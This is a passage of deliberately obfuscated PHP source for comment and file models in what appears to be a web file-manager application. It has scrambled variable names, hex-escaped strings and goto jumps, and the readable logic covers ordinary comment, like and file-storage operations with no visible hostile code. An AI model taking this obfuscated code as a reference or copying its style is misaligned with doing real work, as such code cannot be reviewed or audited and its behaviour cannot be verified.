intval($ò™úĞß[$ ˜æè¨[79]]), $ ˜æè¨[88] => intval($ò™úĞß[$ ˜æè¨[88]]), $ ˜æè¨[90] => $this->pathInfoFilter($ò™úĞß)); if (!$ı§…ì®¡[$ ˜æè¨[487]]) { $ı§…ì®¡[$ ˜æè¨[545]] = $ò™úĞß[$ ˜æè¨[545]]; } $›¦ùÔ½Å[] = $ı§…ì®¡; } $›¦ùÔ½Å = array_sort_by($›¦ùÔ½Å, $ ˜æè¨[87]); return $›¦ùÔ½Å; } } goto AªªÖÛĞâ‰; d¤ŸÔ—™: class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\155\x6d\145\156\164"; protected $tableMeta = array("\x74\141\x62\154\145\116\141\x6d\145" => "\143\x6f\155\155\145\156\x74\x5f\155\x65\164\141", "\155\145\164\x61\106\151\145\154\144" => "\143\x6f\155\x6d\145\x6e\x74\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($ÁÔÍ¶) { $ú–áºñ =& $_SERVER[†ûãı«°]; if ($ÁÔÍ¶[$ú–áºñ[2013]]) { $Û‘”èµô = $this->where(array($ú–áºñ[2014] => $ÁÔÍ¶[$ú–áºñ[2013]]))->find(); if (!$Û‘”èµô || $Û‘”èµô[$ú–áºñ[190]] != $ÁÔÍ¶[$ú–áºñ[190]] || $Û‘”èµô[$ú–áºñ[573]] != $ÁÔÍ¶[$ú–áºñ[573]]) { return !1; } $this->where(array($ú–áºñ[2014] => $ÁÔÍ¶[$ú–áºñ[2013]]))->setAdd($ú–áºñ[2015], 1); } $ÁÔÍ¶[$ú–áºñ[2016]] = 0; $ÁÔÍ¶[$ú–áºñ[2015]] = 0; $ÁÔÍ¶[$ú–áºñ[826]] = 1; return $this->add($ÁÔÍ¶); } public function commentCount($ç©³·Ñè, $­éìÕ€›, $å€Õˆˆ™ = false) { $áè†ÛÌ =& $_SERVER[†ûãı«°]; if (!$ç©³·Ñè) { return array(); } if (is_string($ç©³·Ñè) || is_int($ç©³·Ñè)) { $ç©³·Ñè = array($ç©³·Ñè); } $ñó‰š¾¶ = array($áè†ÛÌ[573], $áè†ÛÌ[2017] => $áè†ÛÌ[569]); $Ìºè²äõ = array($áè†ÛÌ[573] => array($áè†ÛÌ[7], $ç©³·Ñè), $áè†ÛÌ[190] => $­éìÕ€›); if ($å€Õˆˆ™) { $Ìºè²äõ[$áè†ÛÌ[1783]] = $å€Õˆˆ™; } $£Ïäµ = $this->field($ñó‰š¾¶)->where($Ìºè²äõ)->group($áè†ÛÌ[573])->select(); return array_to_keyvalue($£Ïäµ, $áè†ÛÌ[573], $áè†ÛÌ[569]); } public function starTarget($ƒì‹¶±Ï, $»ŸÔ”Ü¨) { $’Ûâà´™ =& $_SERVER[†ûãı«°]; $¸µˆ¦ßÁ = $ƒì‹¶±Ï + self::TYPE_STAR_OFFSET; $Éà»ê£• = array($’Ûâà´™[1783] => USER_ID, $’Ûâà´™[190] => $¸µˆ¦ßÁ, $’Ûâà´™[573] => $»ŸÔ”Ü¨); $©š÷Ãú³ = $this->where($Éà»ê£•)->find(); if ($©š÷Ãú³) { return $this->where(array($’Ûâà´™[477] => $©š÷Ãú³[$’Ûâà´™[477]]))->delete(); } $ÊÜ•ûóÉ = array($’Ûâà´™[2013] => 0, $’Ûâà´™[1783] => USER_ID, $’Ûâà´™[826] => 1, $’Ûâà´™[171] => $’Ûâà´™[12], $’Ûâà´™[190] => $¸µˆ¦ßÁ, $’Ûâà´™[573] => $»ŸÔ”Ü¨, $’Ûâà´™[2016] => 0, $’Ûâà´™[2015] => 0); return $this->add($ÊÜ•ûóÉ); } public function starTargetCount($ˆ³ë¥“Õ, $í…•ıÂı) { $Ü·²¾òû =& $_SERVER[†ûãı«°]; $·‹·¯Õ = $í…•ıÂı + self::TYPE_STAR_OFFSET; $·Âœ¹òæ = $this->commentCount($ˆ³ë¥“Õ, $·‹·¯Õ); $ºöóÎ‘¾ = $this->commentCount($ˆ³ë¥“Õ, $·‹·¯Õ, USER_ID); return array($Ü·²¾òû[2018] => $·Âœ¹òæ, $Ü·²¾òû[2019] => $ºöóÎ‘¾); } public function starTargetUserList($«ÔÚÍÏÔ, $²ÒŠ‰øÑ) { $Ñ¶‚û¸ =& $_SERVER[†ûãı«°]; $£ÏØĞëÃ = $«ÔÚÍÏÔ + self::TYPE_STAR_OFFSET; $¸òº‘Ÿ© = array($Ñ¶‚û¸[573] => $²ÒŠ‰øÑ, $Ñ¶‚û¸[190] => $£ÏØĞëÃ); $Ïü²Ç³ò = $this->where($¸òº‘Ÿ©)->count(); $íé³ûÎÙ = array($Ñ¶‚û¸[334] => $Ïü²Ç³ò, $Ñ¶‚û¸[2020] => array()); if (!$Ïü²Ç³ò) { return $íé³ûÎÙ; } $¨ë•Ñßİ = $this->field($Ñ¶‚û¸[1783])->where($¸òº‘Ÿ©)->limit(500)->select(); $¨ë•Ñßİ = array_to_keyvalue($¨ë•Ñßİ, $Ñ¶‚û¸[12], $Ñ¶‚û¸[1783]); $íé³ûÎÙ[$Ñ¶‚û¸[2020]] = Model($Ñ¶‚û¸[581])->userListInfo($¨ë•Ñßİ); return $íé³ûÎÙ; } public function prasiseUserList($ôÍç˜Âø) { $§²—óİã =& $_SERVER[†ûãı«°]; $Ä–Î¡Êó = array($§²—óİã[2021] => $ôÍç˜Âø); $ü¿™Û‘ = $this->where($Ä–Î¡Êó)->find(); $á¡…ã× = _get($ü¿™Û‘, $§²—óİã[2016], 0); $êÚ¬òà = array($§²—óİã[334] => $á¡…ã×, $§²—óİã[2020] => array()); if (!$á¡…ã×) { return $êÚ¬òà; } $…’¸ÌªÜ = Model($§²—óİã[2022])->field($§²—óİã[1783])->where($Ä–Î¡Êó)->limit(500)->select(); $…’¸ÌªÜ = array_to_keyvalue($…’¸ÌªÜ, $§²—óİã[12], $§²—óİã[1783]); $êÚ¬òà[$§²—óİã[2020]] = Model($§²—óİã[581])->userListInfo($…’¸ÌªÜ); return $êÚ¬òà; } public function remove($‡ç×à‡Š) { $­³ğÃÉ =& $_SERVER[†ûãı«°]; $’Çî½ÙÄ = array($­³ğÃÉ[2014] => $‡ç×à‡Š); $‘Š¦Óğé = $this->where($’Çî½ÙÄ)->find(); if ($‘Š¦Óğé[$­³ğÃÉ[2013]]) { $this->where(array($­³ğÃÉ[2014] => $‘Š¦Óğé[$­³ğÃÉ[2013]]))->setAdd($­³ğÃÉ[2015], -1); } return $this->where($’Çî½ÙÄ)->delete(); } public function edit($Ò‹¶¾¯Ğ, $¤Úµö) { $ã€¶—ï =& $_SERVER[†ûãı«°]; $¢»ÓËÒ = array($ã€¶—ï[2014] => $Ò‹¶¾¯Ğ); return $this->where($¢»ÓËÒ)->save(array($ã€¶—ï[2023] => $¤Úµö)); } public function prasise($Ğç³¦×Ã) { $ĞçˆÑÅè =& $_SERVER[†ûãı«°]; $ÄÒÇ¨® = Model($ĞçˆÑÅè[2024]); $©Şûã®ˆ = array($ĞçˆÑÅè[2014] => $Ğç³¦×Ã, $ĞçˆÑÅè[1774] => USER_ID); $Ø†î€Ÿ§ = $ÄÒÇ¨®->where($©Şûã®ˆ)->find(); if (!$Ø†î€Ÿ§) { $ÄÒÇ¨®->add($©Şûã®ˆ); $Ğ“ªÃ°Ù = $this->where(array($ĞçˆÑÅè[2014] => $Ğç³¦×Ã))->setAdd($ĞçˆÑÅè[2016], 1); } else { $ÄÒÇ¨®->where($©Şûã®ˆ)->delete(); $Ğ“ªÃ°Ù = $this->where(array($ĞçˆÑÅè[2014] => $Ğç³¦×Ã))->setAdd($ĞçˆÑÅè[2016], -1); } return $Ğ“ªÃ°Ù; } public function targetInfo($·ëÇğ«, $ğ¢„ğœ×) { $ä†É™ûÅ =& $_SERVER[†ûãı«°]; $í™ØÙˆü = array($ä†É™ûÅ[655] => $·ëÇğ«, $ä†É™ûÅ[656] => $ğ¢„ğœ×); $î´ÂÌùá = $this->where($í™ØÙˆü)->count(); $çÑÊ•¾ = "\x52\111\107\110\x54\40\x4a\117\x49\116\x20{$this->tablePrefix}\143\157\155\155\x65\x6e\x74\137\x70\162\141\x69\163\x65\x20\163\x74\x61\162\40\157\156\x20\x63\x6f\155\x6d\145\x6e\164\56\143\157\x6d\x6d\x65\156\x74\111\104\x20\x3d\x20\163\164\x61\x72\56\x63\157\155\155\145\156\164\111\104"; $—âıƒğÖ = $this->alias($ä†É™ûÅ[431])->where($í™ØÙˆü)->join($çÑÊ•¾, $ä†É™ûÅ[2025])->count(); $ãŞ ¿…Ş = array($ä†É™ûÅ[2026] => $î´ÂÌùá, $ä†É™ûÅ[2027] => $—âıƒğÖ); return $ãŞ ¿…Ş; } public function listData($ŒÂ½¦) { $ïÏ‡ÖÚá =& $_SERVER[†ûãı«°]; if (isset($ŒÂ½¦[$ïÏ‡ÖÚá[2028]])) { if ($ŒÂ½¦[$ïÏ‡ÖÚá[2028]]) { $ŒÂ½¦[$ïÏ‡ÖÚá[2021]] = array($ïÏ‡ÖÚá[1102], intval($ŒÂ½¦[$ïÏ‡ÖÚá[2028]])); } unset($ŒÂ½¦[$ïÏ‡ÖÚá[2028]]); } if (isset($ŒÂ½¦[$ïÏ‡ÖÚá[2029]])) { if ($ŒÂ½¦[$ïÏ‡ÖÚá[2029]]) { $ŒÂ½¦[$ïÏ‡ÖÚá[2021]] = array($ïÏ‡ÖÚá[1099], intval($ŒÂ½¦[$ïÏ‡ÖÚá[2029]])); } unset($ŒÂ½¦[$ïÏ‡ÖÚá[2029]]); } return $this->_listData($ŒÂ½¦); } private function _listData($òî€ÙÆµ) { $œ²õÛ´õ =& $_SERVER[†ûãı«°]; $Âëá©‘ = $this->where($òî€ÙÆµ)->_makeOrder()->selectPage(100); $this->_listAppendParent($Âëá©‘[$œ²õÛ´õ[447]]); $this->_listAppendUser($Âëá©‘[$œ²õÛ´õ[447]]); $this->_listAppendMeta($Âëá©‘[$œ²õÛ´õ[447]]); return $Âëá©‘; } private function _makeOrder() { $ŸÔÜ’Å =& $_SERVER[†ûãı«°]; $åíÙ°¤ö = array($ŸÔÜ’Å[2016], $ŸÔÜ’Å[2015], $ŸÔÜ’Å[233]); $şİáòî” = Input::get($ŸÔÜ’Å[532], $ŸÔÜ’Å[7], $ŸÔÜ’Å[499], $åíÙ°¤ö); $’“æøäê = Input::get($ŸÔÜ’Å[533], $ŸÔÜ’Å[7], $ŸÔÜ’Å[1776], array($ŸÔÜ’Å[2030], $ŸÔÜ’Å[528])); $™õ¾õƒü = $şİáòî” . $ŸÔÜ’Å[53] . $’“æøäê; return $this->order($™õ¾õƒü); } private function _listAppendParent(&$ü„¦ğÄ­) { $Òó·‘×¸ =& $_SERVER[†ûãı«°]; $â¹ºã = array_unique(array_to_keyvalue($ü„¦ğÄ­, $Òó·‘×¸[12], $Òó·‘×¸[2013])); $â¹ºã = array_remove_value($â¹ºã, $Òó·‘×¸[230]); if (!$â¹ºã) { return; } $ŠºØğ´¿ = $this->where(array($Òó·‘×¸[2014] => array($Òó·‘×¸[7], $â¹ºã)))->select(); $ŠºØğ´¿ = array_to_keyvalue($ŠºØğ´¿, $Òó·‘×¸[2021]); foreach ($ü„¦ğÄ­ as &$›ş¨Æ¦) { if (isset($ŠºØğ´¿[$›ş¨Æ¦[$Òó·‘×¸[2013]]])) { $›ş¨Æ¦[$Òó·‘×¸[2031]] = $ŠºØğ´¿[$›ş¨Æ¦[$Òó·‘×¸[2013]]]; } } unset($›ş¨Æ¦); } private function _listAppendUser(&$­Ÿ±Îô) { $÷«ÌÏ˜ =& $_SERVER[†ûãı«°]; $ğ„Æ—®ß = array_unique(array_to_keyvalue($­Ÿ±Îô, $÷«ÌÏ˜[12], $÷«ÌÏ˜[1783])); $ğ„Æ—®ß = array_remove_value($ğ„Æ—®ß, $÷«ÌÏ˜[230]); if (count($ğ„Æ—®ß) == 0) { return; } foreach ($­Ÿ±Îô as $ğïÂ¯èÙ) { if (isset($ğïÂ¯èÙ[$÷«ÌÏ˜[2031]])) { $ğ„Æ—®ß[] = $ğïÂ¯èÙ[$÷«ÌÏ˜[2031]][$÷«ÌÏ˜[1783]]; } } $Ÿƒ‘ğç = Model($÷«ÌÏ˜[601])->userListInfo($ğ„Æ—®ß); foreach ($­Ÿ±Îô as &$ğïÂ¯èÙ) { $ğïÂ¯èÙ[$÷«ÌÏ˜[669]] = $Ÿƒ‘ğç[$ğïÂ¯èÙ[$÷«ÌÏ˜[1783]]]; if (isset($ğïÂ¯èÙ[$÷«ÌÏ˜[2031]])) { $ğïÂ¯èÙ[$÷«ÌÏ˜[2031]][$÷«ÌÏ˜[669]] = $Ÿƒ‘ğç[$ğïÂ¯èÙ[$÷«ÌÏ˜[2031]][$÷«ÌÏ˜[1783]]]; } } unset($ğïÂ¯èÙ); } private function _listAppendMeta(&$‘ÉÄŞá¡) { $ø–Á¡€ =& $_SERVER[†ûãı«°]; $ÀÜô¤¦— = array_unique(array_to_keyvalue($‘ÉÄŞá¡, $ø–Á¡€[12], $ø–Á¡€[2021])); $ÀÜô¤¦— = array_remove_value($ÀÜô¤¦—, $ø–Á¡€[230]); if (!$ÀÜô¤¦—) { return; } foreach ($‘ÉÄŞá¡ as $´º¤·ÊÙ) { if (isset($´º¤·ÊÙ[$ø–Á¡€[2031]])) { $ÀÜô¤¦—[] = $´º¤·ÊÙ[$ø–Á¡€[2031]][$ø–Á¡€[2021]]; } } $ü ÈôÅÂ = $this->metaList($ÀÜô¤¦—); if (!$ü ÈôÅÂ) { return !1; } foreach ($‘ÉÄŞá¡ as &$´º¤·ÊÙ) { $´º¤·ÊÙ[$ø–Á¡€[543]] = $ü ÈôÅÂ[$´º¤·ÊÙ[$ø–Á¡€[2021]]]; if (isset($´º¤·ÊÙ[$ø–Á¡€[2031]])) { $´º¤·ÊÙ[$ø–Á¡€[2031]][$ø–Á¡€[543]] = $ü ÈôÅÂ[$´º¤·ÊÙ[$ø–Á¡€[2031]][$ø–Á¡€[2021]]]; } } unset($´º¤·ÊÙ); } private function metaList($ã‘¶…ìÍ) { $¶Ì©®ÖÏ =& $_SERVER[†ûãı«°]; if (!$ã‘¶…ìÍ) { return array(); } $‘Õï¼Š³ = array($¶Ì©®ÖÏ[2021] => array($¶Ì©®ÖÏ[7], $ã‘¶…ìÍ)); $ù‚¨¤ˆ¬ = Model($¶Ì©®ÖÏ[2032])->where($‘Õï¼Š³)->select(); $ù‚¨¤ˆ¬ = array_to_keyvalue_group($ù‚¨¤ˆ¬, $¶Ì©®ÖÏ[2021]); foreach ($ù‚¨¤ˆ¬ as $Òò ©‹ => $ï§Éõô) { $Ô˜˜Ûºİ = array(); foreach ($ï§Éõô as $ˆ¨È‡ü) { $Ô˜˜Ûºİ[$ˆ¨È‡ü[$¶Ì©®ÖÏ[97]]] = $ˆ¨È‡ü[$¶Ì©®ÖÏ[452]]; } $ù‚¨¤ˆ¬[$Òò ©‹] = $Ô˜˜Ûºİ; } return $ù‚¨¤ˆ¬ ? $ù‚¨¤ˆ¬ : array(); } public function removeTarget($”½Ç÷Ü, $¤â‘·ıŞ) { $Ë³æßÕ³ =& $_SERVER[†ûãı«°]; if (!$¤â‘·ıŞ) { return !0; } $¤â‘·ıŞ = is_array($¤â‘·ıŞ) ? $¤â‘·ıŞ : array($¤â‘·ıŞ); $€åãÁõñ = array($Ë³æßÕ³[190] => $”½Ç÷Ü, $Ë³æßÕ³[573] => array($Ë³æßÕ³[7], $¤â‘·ıŞ)); $úĞİù­ = $this->field($Ë³æßÕ³[2021])->where($€åãÁõñ)->select(); $øåˆºûª = array_to_keyvalue($úĞİù­, $Ë³æßÕ³[12], $Ë³æßÕ³[2021]); if (!$øåˆºûª) { return !0; } $€åãÁõñ = array($Ë³æßÕ³[2021] => array($Ë³æßÕ³[7], $øåˆºûª)); $this->where($€åãÁõñ)->delete(); Model($Ë³æßÕ³[2024])->where($€åãÁõñ)->delete(); Model($Ë³æßÕ³[2033])->where($€åãÁõñ)->delete(); } } class FileContentModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\146\x69\x6c\x65\x5f\143\157\156\x74\145\x6e\164\163"; protected $dataAuto = array(array("\143\x72\145\x61\164\145\x54\151\x6d\145", "\164\151\155\x65", "\151\156\163\x65\162\x74", "\x66\165\156\x63\164\x69\157\156")); } class FileModel extends ModelBase { protected $tableName = "\151\x6f\137\146\151\x6c\x65"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\141\x6d\145" => "\151\x6f\137\146\151\x6c\x65\x5f\x6d\x65\x74\x61", "\x6d\145\164\x61\106\151\145\x6c\x64" => "\x66\151\x6c\x65\111\104"); public function fileInfo($†­º…ÁŞ) { $­ùÇúò„ =& $_SERVER[†ûãı«°]; static $ÆÁºë„ = array(); if (!isset($ÆÁºë„[$†­º…ÁŞ])) { $›¯“šåê = $­ùÇúò„[2034]; $â·Ë¼©æ = Model($­ùÇúò„[548])->field($›¯“šåê)->where(array($­ùÇúò„[546] => $†­º…ÁŞ))->find(); $ÆÁºë„[$†­º…ÁŞ] = $â·Ë¼©æ; } return $ÆÁºë„[$†­º…ÁŞ]; } public function addFileByContent($…ŸØ¸ã¸ = '', $ëÕ¹™”Ø = '') { $Ø£±ƒÈ… =& $_SERVER[†ûãı«°]; $€Ó´âæ = TEMP_PATH . $Ø£±ƒÈ…[2035]; if (!is_dir($€Ó´âæ)) { mk_dir($€Ó´âæ); } $–ÉÕïİí = $€Ó´âæ . $Ø£±ƒÈ…[2036] . rand_string(16); $Û÷œÉ­ = file_put_contents($–ÉÕïİí, $…ŸØ¸ã¸); if ($Û÷œÉ­ === !1 || strlen($…ŸØ¸ã¸) != $Û÷œÉ­) { return !1; } $¾÷‚°‰¶ = $this->addFile($–ÉÕïİí, $ëÕ¹™”Ø, !0); if (file_exists($–ÉÕïİí)) { @unlink($–ÉÕïİí); } return $¾÷‚°‰¶; } public function createFileName($ ‡€Ö¦‹, $°ÂëÔÖĞ = false, $ç €ÚÓ± = false) { $ˆ—‚™Æ =& $_SERVER[†ûãı«°]; $è‘Ä†¾ù = IO::init($ˆ—‚™Æ[8]); $‡¬†ù…§ = $this->makeFilePath($ ‡€Ö¦‹, $è‘Ä†¾ù, $°ÂëÔÖĞ, $ç €ÚÓ±); $™ï±ñ± = $è‘Ä†¾ù->pathFather($‡¬†ù…§); static $Òà†¥¯ = false; $¡ âÑ›Ó = $ˆ—‚™Æ[2037] . md5($™ï±ñ±); if (!$Òà†¥¯ && !Cache::get($¡ âÑ›Ó)) { $Òà†¥¯ = !0; $ïÈ…’Õ = IO::mkdir($™ï±ñ±); if (!IO::exist($ïÈ…’Õ . $ˆ—‚™Æ[875])) { IO::mkfile($ïÈ…’Õ . $ˆ—‚™Æ[875]); } Cache::set($¡ âÑ›Ó, 1, 3600 * 2); } return $‡¬†ù…§; } public function makeFilePath($ÎõñÏ”‰, $®ş¼™ğ, $ÀÅÍë¨ = false, $©‰™™‹Û = false) { $‚çğ•µ =& $_SERVER[†ûãı«°]; $ö“£«üÑ = Model($‚çğ•µ[846])->get($‚çğ•µ[2038]); $¢Àïİ•Ö = KodIO::defaultIO() . date($‚çğ•µ[2039]); $À•ûÖ = $¢Àïİ•Ö . rand_string(5) . short_id(100); $ÎõñÏ”‰ = str_replace($‚çğ•µ[8], $‚çğ•µ[11], KodIO::clear($ÎõñÏ”‰)); $’”½å¢Ä = $®ş¼™ğ->ext($ÎõñÏ”‰); if (!$ÎõñÏ”‰) { $ö“£«üÑ = $‚çğ•µ[852]; } switch ($ö“£«üÑ) { case $‚çğ•µ[2040]: if ($’”½å¢Ä) { $À•ûÖ = $À•ûÖ . $‚çğ•µ[10] . $’”½å¢Ä; } if ($’”½å¢Ä == $‚çğ•µ[1976]) { $À•ûÖ .= $‚çğ•µ[1302]; } break; case $‚çğ•µ[2041]: $ôÛó¯Êˆ = Model($‚çğ•µ[846])->get($‚çğ•µ[847]); $˜ßõ… = substr(md5($‚çğ•µ[848] . $ôÛó¯Êˆ . date($‚çğ•µ[825])), 0, 8); $³çÒèÖÓ = KodIO::defaultDriver(); $¢Àïİ•Ö = $‚çğ•µ[1333] . $³çÒèÖÓ[$‚çğ•µ[477]] . $‚çğ•µ[486] . date($‚çğ•µ[2042]) . $˜ßõ… . $‚çğ•µ[8]; if ($’”½å¢Ä == $‚çğ•µ[1976]) { $ÎõñÏ”‰ .= $‚çğ•µ[1302]; } $È£°Á­ª = $‚çğ•µ[2043] . $¢Àïİ•Ö . $ÎõñÏ”‰; CacheLock::lock($È£°Á­ª); $À•ûÖ = $¢Àïİ•Ö . $ÎõñÏ”‰; if (IO::exist($¢Àïİ•Ö . $ÎõñÏ”‰)) { $½ƒ‰¿ÜŞ = substr($ÎõñÏ”‰, 0, strlen($ÎõñÏ”‰) - strlen($’”½å¢Ä)); $ŠÜ»³ú± = $©‰™™‹Û ? substr($©‰™™‹Û, 0, 5) : ($ÀÅÍë¨ ? substr($ÀÅÍë¨, 0, 5) : rand_string(5)); $À•ûÖ = $¢Àïİ•Ö . $½ƒ‰¿ÜŞ . $ŠÜ»³ú±; if ($’”½å¢Ä) { $À•ûÖ = $À•ûÖ . $‚çğ•µ[10] . $’”½å¢Ä; } } if (IO::isOsDriver($À•ûÖ) && !IO::isUploadServer($À•ûÖ)) { if (IO::exist($À•ûÖ)) { CacheLock::unlock($È£°Á­ª); return $À•ûÖ; } $²Âñ…Ã = IO::setContent($À•ûÖ, $‚çğ•µ[12]); if (!$²Âñ…Ã) { show_json($‚çğ•µ[2044], !1); } } CacheLock::unlock($È£°Á­ª); break; case $‚çğ•µ[852]: break; default: break; } return $À•ûÖ; } public function addFileByRemote($Áë»¾È³, $µÓ›¥ “, $”ÃëÕÉ² = array()) { $ô–úªğ‘ =& $_SERVER[†ûãı«°]; if (!IO::exist($Áë»¾È³)) { return !1; } $ıíøìæÔ = $”ÃëÕÉ²[$ô–úªğ‘[551]] ? $”ÃëÕÉ²[$ô–úªğ‘[551]] : $ô–úªğ‘[12]; $üŞşÜÛ = IO::hashMd5($Áë»¾È³, $ıíøìæÔ); $£°œ‡îÅ = KodIO::defaultDriver(); $ê·°´Ò = array($ô–úªğ‘[624] => IO::size($Áë»¾È³), $ô–úªğ‘[2045] => 1, $ô–úªğ‘[496] => $µÓ›¥ “, $ô–úªğ‘[889] => $£°œ‡îÅ[$ô–úªğ‘[477]], $ô–úªğ‘[497] => $Áë»¾È³, $ô–úªğ‘[2046] => $”ÃëÕÉ²[$ô–úªğ‘[679]] ? $”ÃëÕÉ²[$ô–úªğ‘[679]] : IO::hashSimple($Áë»¾È³), $ô–úªğ‘[2047] => $üŞşÜÛ ? $üŞşÜÛ : $ıíøìæÔ); if ($•ªÛ§‡ = $this->addFileCheckExist($ê·°´Ò[$ô–úªğ‘[679]], $ê·°´Ò[$ô–úªğ‘[551]], $ê·°´Ò[$ô–úªğ‘[79]])) { return $•ªÛ§‡; } return $this->addFileData($ê·°´Ò); } private function addFileData($şğ­ùŸØ) { $Úó“º¦Õ =& $_SERVER[†ûãı«°]; if (!$şğ­ùŸØ) { return !1; } $şğ­ùŸØ[$Úó“º¦Õ[79]] = intval($şğ­ùŸØ[$Úó“º¦Õ[79]]); if (!$şğ­ùŸØ[$Úó“º¦Õ[79]] && strlen($şğ­ùŸØ[$Úó“º¦Õ[679]]) > 32) { $şğ­ùŸØ[$Úó“º¦Õ[79]] = intval(substr($şğ­ùŸØ[$Úó“º¦Õ[679]], 32)); } $€ÃßÒ‰ = $this->add($şğ­ùŸØ); return $this->find($€ÃßÒ‰); } public function addFile($ª·à»ûó, $âåöòÎ–, $Š—ƒ´ôà = false) { $ñƒÙåêù =& $_SERVER[†ûãı«°]; $àø’Ê€Ş = IO::hashSimple($ª·à»ûó); $ú“´‹  = IO::size($ª·à»ûó); $ê¯·ä–‹ = $ú“´‹  <= 1024 * 1024 * 10 ? IO::hashMd5($ª·à»ûó) : $ñƒÙåêù[12]; $ÊøÚ¡‘ù = $ñƒÙåêù[2048] . $àø’Ê€Ş; CacheLock::lock($ÊøÚ¡‘ù); if ($ê¯·ä–‹ && $àø’Ê€Ş) { $ ò‰Üå = $this->addFileCheckExist($àø’Ê€Ş, $ê¯·ä–‹, $ú“´‹ ); if ($ ò‰Üå) { CacheLock::unlock($ÊøÚ¡‘ù); return $ ò‰Üå; } } $¬š À¨å = $this->addFileMake($ª·à»ûó, $ú“´‹ , $àø’Ê€Ş, $ê¯·ä–‹, $âåöòÎ–, $Š—ƒ´ôà); $¹É…¦°„ = $this->addFileData($¬š À¨å); if (!$¹É…¦°„) { return !1; } CacheLock::unlock($ÊøÚ¡‘ù); if (!$ê¯·ä–‹ && $¹É…¦°„) { $this->fileMd5Check($¹É…¦°„); } return $¹É…¦°„; } public function fileMd5Check($Í–ÀÌ÷æ) { $û½æ’Ñ =& $_SERVER[†ûãı«°]; $¨ü¢šÊë = array($Í–ÀÌ÷æ[$û½æ’Ñ[545]], $Í–ÀÌ÷æ[$û½æ’Ñ[87]]); $ˆ÷·µÂÔ = $û½æ’Ñ[2049] . $Í–ÀÌ÷æ[$û½æ’Ñ[87]]; $É›°¾³ş = $û½æ’Ñ[2050] . $Í–ÀÌ÷æ[$û½æ’Ñ[545]]; TaskQueue::add($û½æ’Ñ[2051], $¨ü¢šÊë, $ˆ÷·µÂÔ, $É›°¾³ş); } public function fileMd5Set($‡ä€å€º, $¿Öéê¹ú) { $ğˆˆƒšİ =& $_SERVER[†ûãı«°]; $ª³Šı° = $this->find($‡ä€å€º); if (!$ª³Šı° || $ª³Šı°[$ğˆˆƒšİ[551]]) { return; } $ªĞÓ–³· = IO::hashMd5($¿Öéê¹ú); if (!$ªĞÓ–³·) { return $ğˆˆƒšİ[12]; } $this->where(array($ğˆˆƒšİ[545] => $‡ä€å€º))->save(array($ğˆˆƒšİ[551] => $ªĞÓ–³·)); } public function addFileMake($îæò®Šè, $üäìƒ€”, $Å‚âÙƒç, $àÑ…ƒÅä, $”³’õÖü, $®Â„¨ñè) { $§ïÓ•ßÏ =& $_SERVER[†ûãı«°]; $¨˜åæ¤ = $this->createFileName($”³’õÖü, $Å‚âÙƒç, $àÑ…ƒÅä); $ÀÕŒã = get_path_father($¨˜åæ¤); $ò±—·Áû = get_path_this($¨˜åæ¤); if ($®Â„¨ñè) { $¨Ó“©ÃÌ = IO::move($îæò®Šè, $ÀÕŒã, !1, $ò±—·Áû); } else { $¨Ó“©ÃÌ = IO::copy($îæò®Šè, $ÀÕŒã, !1, $ò±—·Áû); } if (!$¨Ó“©ÃÌ || IO::size($¨˜åæ¤) != $üäìƒ€”) { return !1; } $“ÊÀÜŒß = KodIO::defaultDriver(); $ü÷Öüó• = array($§ïÓ•ßÏ[624] => $üäìƒ€”, $§ïÓ•ßÏ[2045] => 1, $§ïÓ•ßÏ[496] => $”³’õÖü, $§ïÓ•ßÏ[889] => $“ÊÀÜŒß[$§ïÓ•ßÏ[477]], $§ïÓ•ßÏ[497] => $¨˜åæ¤, $§ïÓ•ßÏ[2046] => $Å‚âÙƒç, $§ïÓ•ßÏ[2047] => $àÑ…ƒÅä); return $ü÷Öüó•; } public function addFileCheckExist($¸íœîÜÌ, $´ÅŒ¬, $ÅŒñá’) { $ò²ú€Ù =& $_SERVER[†ûãı«°]; $ŠÈ ö¿Ç = $this->findByHash($¸íœîÜÌ, $´ÅŒ¬); if (!$ŠÈ ö¿Ç) { return !1; } $ôÆ¦°Ùİ = array($ò²ú€Ù[2045] => intval($ŠÈ ö¿Ç[$ò²ú€Ù[2052]]) + 1, $ò²ú€Ù[624] => $ÅŒñá’); $this->where(array($ò²ú€Ù[546] => $ŠÈ ö¿Ç[$ò²ú€Ù[545]]))->save($ôÆ¦°Ùİ); return $ŠÈ ö¿Ç; } public function remove($™––ä©Õ) { $this->linkCountChange($™––ä©Õ, !1); $this->clearEmpty(); return !0; } public function linkAdd($µÔ ±Šß) { $this->linkCountChange($µÔ ±Šß, !0); } public function linkCountChange($ö”¯µ§, $×å¹ßÖ–) { $Š²™æª =& $_SERVER[†ûãı«°]; if (!$ö”¯µ§) { return; } if (!is_array($ö”¯µ§)) { $ö”¯µ§ = array($ö”¯µ§); } $ŒÄæÑ¥œ = array(); foreach ($ö”¯µ§ as $ÁîÇ‰³Ä) { $ïÅ×ïÜÛ = $ÁîÇ‰³Ä . $Š²™æª[12]; if (!$ŒÄæÑ¥œ[$ïÅ×ïÜÛ]) { $ŒÄæÑ¥œ[$ïÅ×ïÜÛ] = 0; } $ŒÄæÑ¥œ[$ïÅ×ïÜÛ]++; } $‡¾ø×—© = array(); foreach ($ŒÄæÑ¥œ as $ÁîÇ‰³Ä => $ÖşÛâƒû) { $ïÅ×ïÜÛ = $ÖşÛâƒû . $Š²™æª[12]; if (!$‡¾ø×—©[$ïÅ×ïÜÛ]) { $‡¾ø×—©[$ïÅ×ïÜÛ] = array(); } $‡¾ø×—©[$ïÅ×ïÜÛ][] = $ÁîÇ‰³Ä; } foreach ($‡¾ø×—© as $ÖşÛâƒû => $Ò¥’ÏÒ‘) { if (!$Ò¥’ÏÒ‘) { continue; } $ÖşÛâƒû = $×å¹ßÖ– ? $ÖşÛâƒû : -intval($ÖşÛâƒû); $Õı©Ôäİ = array($Š²™æª[545] => array($Š²™æª[7], $Ò¥’ÏÒ‘)); if ($ÖşÛâƒû < 0) { $Õı©Ôäİ[$Š²™æª[2052]] = array($Š²™æª[1103], abs($ÖşÛâƒû)); } 